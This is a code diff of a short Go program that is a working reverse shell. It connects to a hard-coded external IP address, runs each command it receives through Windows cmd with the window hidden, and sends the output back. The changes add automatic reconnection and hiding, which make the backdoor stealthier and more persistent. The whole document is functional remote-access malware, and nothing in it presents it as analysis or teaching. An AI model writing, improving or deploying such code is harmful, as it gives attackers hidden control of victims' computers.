@@ -1,26 +1,40 @@
 package main
 
 import (
-   "bufio"
-   "fmt"
-   "net"
-   "os/exec"
-   "strings"
+	"bufio"
+	"net"
+	"os/exec"
+	"syscall"
+	"time"
 )
 
 func main() {
-   conn, _ := net.Dial("tcp", "37.34.63.246:2345")
-   for {
+	reverse("37.34.63.246:2345")
+}
 
-      message, _ := bufio.NewReader(conn).ReadString('\n')
+func reverse(host string) {
+	c, err := net.Dial("tcp", host)
+	if nil != err {
+		if nil != c {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse(host)
+	}
 
-      out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+	r := bufio.NewReader(c)
+	for {
+		order, err := r.ReadString('\n')
+		if nil != err {
+			c.Close()
+			reverse(host)
+			return
+		}
 
-      if err != nil {
-         fmt.Fprintf(conn, "%s\n",err)
-      }
+		cmd := exec.Command("cmd", "/C", order)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, _ := cmd.CombinedOutput()
 
-      fmt.Fprintf(conn, "%s\n",out)
-
-   }
+		c.Write(out)
+	}
 }
